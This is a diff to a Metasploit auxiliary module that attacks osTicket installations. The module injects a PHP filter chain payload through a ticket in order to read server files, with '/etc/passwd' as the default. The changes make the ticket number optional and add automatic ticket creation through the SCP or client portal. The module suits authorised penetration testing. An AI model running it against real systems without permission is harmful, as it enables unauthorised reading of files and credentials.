@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
             OptString.new('TARGETURI', [true, 'Base path to osTicket installation', '/']),
             OptString.new('USERNAME', [true, 'osTicket username or email address']),
             OptString.new('PASSWORD', [true, 'osTicket password']),
-            OptString.new('TICKET_NUMBER', [true, 'Ticket number to use for payload injection (e.g. 978554)']),
+            OptString.new('TICKET_NUMBER', [false, 'Ticket number to use for payload injection (e.g. 978554). If not set, a new ticket is created each run']),
             OptString.new('TICKET_ID', [false, 'Internal ticket ID (auto-detected if not set)']),
             OptEnum.new('LOGIN_PORTAL', [true, 'Login portal to use', 'auto', ['auto', 'scp', 'client']]),
             OptString.new('FILE', [
@@ -64,6 +64,20 @@ class MetasploitModule < Msf::Auxiliary
                 'Path for file to read.',
                 '/etc/passwd'
             ]),
+            OptString.new('SCP_TICKET_EMAIL', [
+                false,
+                'Email for ticket owner when creating tickets via SCP portal login. ' \
+                'Only used if authentication succeeds through the SCP (/scp/) portal.',
+                'user@msf.com'
+            ]),
+            OptString.new('SCP_TICKET_NAME', [
+                false,
+                'Full name for ticket owner when creating tickets via SCP portal login. ' \
+                'Only used if authentication succeeds through the SCP (/scp/) portal.',
+                'MSF User'
+            ]),
+            OptString.new('TICKET_SUBJECT', [false, 'Subject for new ticket if TICKET_NUMBER is not set', 'Support Request']),
+            OptString.new('TICKET_MESSAGE', [false, 'Message body for new ticket if TICKET_NUMBER is not set', 'Please assist.']),
             OptBool.new('STORE_LOOT', [false, 'Store extracted files as loot', true]),
             OptInt.new('MAX_REDIRECTS', [false, 'Maximum number of HTTP redirect hops to follow', 3]),
             OptInt.new('MAX_TICKET_ID', [false, 'Upper bound for brute-force ticket ID search', 20])
@@ -119,13 +133,23 @@ class MetasploitModule < Msf::Auxiliary
     prefix = portal == 'scp' ? '/scp' : ''
     print_good("Authenticated via #{portal} portal")
 
-    # Step 2: Resolve ticket ID
-    print_status('Locating ticket...')
-    ticket_id = resolve_ticket_id(base_uri, prefix, cookies)
-    if ticket_id.nil?
-      fail_with(Failure::NotFound, "Could not find internal ID for ticket ##{datastore['TICKET_NUMBER']}. Try setting TICKET_ID manually.")
+    # Step 2: Locate or create ticket
+    ticket_number = datastore['TICKET_NUMBER'].to_s
+    if ticket_number.empty?
+      print_warning('No TICKET_NUMBER supplied — a new ticket will be created each time this module runs')
+      ticket_id, ticket_number = if portal == 'scp'
+        create_ticket_scp(base_uri, prefix, cookies, datastore['TICKET_SUBJECT'], datastore['TICKET_MESSAGE'])
+      else
+        create_ticket(base_uri, cookies, datastore['TICKET_SUBJECT'], datastore['TICKET_MESSAGE'])
+      end
+      fail_with(Failure::UnexpectedReply, 'Failed to create new ticket') if ticket_id.nil?
+      print_good("Created ticket ##{ticket_number} (internal ID: #{ticket_id})")
+    else
+      print_status('Locating ticket...')
+      ticket_id = resolve_ticket_id(base_uri, prefix, cookies)
+      fail_with(Failure::NotFound, "Could not find internal ID for ticket ##{ticket_number}. Try setting TICKET_ID manually.") if ticket_id.nil?
+      print_good("Ticket ##{ticket_number} has internal ID: #{ticket_id}")
     end
-    print_good("Ticket ##{datastore['TICKET_NUMBER']} has internal ID: #{ticket_id}")
 
     # Step 3: Generate and submit payload
     print_status('Generating PHP filter chain payload...')
